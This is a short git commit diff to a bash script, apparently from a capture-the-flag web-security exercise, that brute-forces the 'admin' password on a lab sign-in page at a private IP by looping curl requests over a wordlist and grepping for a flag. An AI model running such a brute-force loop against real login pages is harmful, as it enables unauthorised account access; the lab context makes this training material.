1133f3561f1d2ba08aa772fc476ac14ffd5b706b
Alexandre MOREILHON <alex@MacBook-Pro-de-Alexandre.local>
2018-05-17 16:15:19 +0200

    push

--- 02-Bruteforce/ressources/bf.sh
+++ 02-Bruteforce/ressources/bf.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-while IFS='' read -r $1 || [[ -n "$line" ]]; do
-	curl "172.16.0.128/?page=signin&username=admin&password=$line&Login=Login" | grep flag
+while IFS='' read -r line || [[ -n "$line" ]]; do
+	curl "172.16.0.128/?page=signin&username=admin&password=$line&Login=Login" | grep flag ; cat $line
 done < "$1"
